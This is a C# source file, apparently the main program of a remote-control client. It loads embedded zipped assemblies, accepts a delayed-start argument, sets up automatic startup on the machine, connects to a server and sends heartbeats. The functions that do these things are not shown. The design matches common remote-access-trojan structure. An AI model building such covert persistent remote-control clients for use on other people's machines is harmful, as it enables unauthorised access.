using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using RemoteControl.Client.Handlers;
using RemoteControl.Client.Utils;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Codec;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client
{
    partial class Program
    {
        private static Socket oServer;
        private static bool isTestMode = true;
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;
        private static string logFilePath = "";

        static Program()
        {
            AssemblyLoader.Register("Newtonsoft.Json.Lite", "RemoteControl.Client.Loaders.Newtonsoft.Json.Lite.dll.zip");
            AssemblyLoader.Register("RemoteControl.Protocals", "RemoteControl.Client.Loaders.RemoteControl.Protocals.dll.zip");
            AssemblyLoader.Attach();
        }

        static void Main(string[] args)
        {
            try
            {
                InitializeLogging();
                DoOutput("客户端启动");

                if (args.Length == 1 && args[0].StartsWith("/delay:"))
                {
                    string str = args[0].Substring("/delay:".Length);
                    int delay = Convert.ToInt32(str);
                    Thread.Sleep(delay);
                    args = new string[] { };
                }

                if (args.Length == 0 || (args.Length == 1 && args[0] == "/r"))
                {
                    RunClient();
                    return;
                }

                DoOutput("启动参数不支持: " + string.Join(" ", args));
            }
            catch (Exception ex)
            {
                DoOutput("客户端异常退出: " + ex);
            }
        }

        static void RunClient()
        {
            EnsureAutoStart();
            if (!StartConnect())
                return;
            heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
            heartbeatThread.Start();
            StartMonitor();
        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
